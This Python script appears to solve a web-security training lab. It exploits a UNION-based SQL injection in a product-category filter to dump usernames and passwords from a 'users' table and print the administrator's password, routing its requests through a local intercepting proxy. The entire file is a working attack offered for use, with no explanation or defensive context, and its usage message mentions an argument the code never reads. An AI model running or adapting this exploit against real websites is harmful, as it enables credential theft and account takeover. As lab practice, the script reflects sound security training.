#!/usr/bin/python3
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http':'http://127.0.0.1:8080', 
    'https':'http://127.0.0.1:8080'
}

def perform_requests(url,sql_payload):
    path = "filter?category=Pets"
    r = requests.get(url + path + sql_payload , verify=False, proxies=proxies)
    return r.text

def exploit_sqli_users_table(url):
    username = 'administrator'
    sql_payload = "' UNION SELECT NULL, username || '-' || password FROM users--"   
    res = perform_requests(url, sql_payload)
    if "administrator" in res:
        print("[+] Found the administrator password")
        soup = BeautifulSoup(res, 'html.parser')
        admin_password = soup.body.find(text=re.compile('.*administrator.*')).split("-")[1]
        print("[+] The administrator's password : '%s'" % admin_password)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1==1"' % sys.argv[0])
        sys.exit(-1)
    
    print("[+] Dumping the list of usernames and passwords...")

    if not exploit_sqli_users_table(url):
        print("[-] Did not find the administrator's password")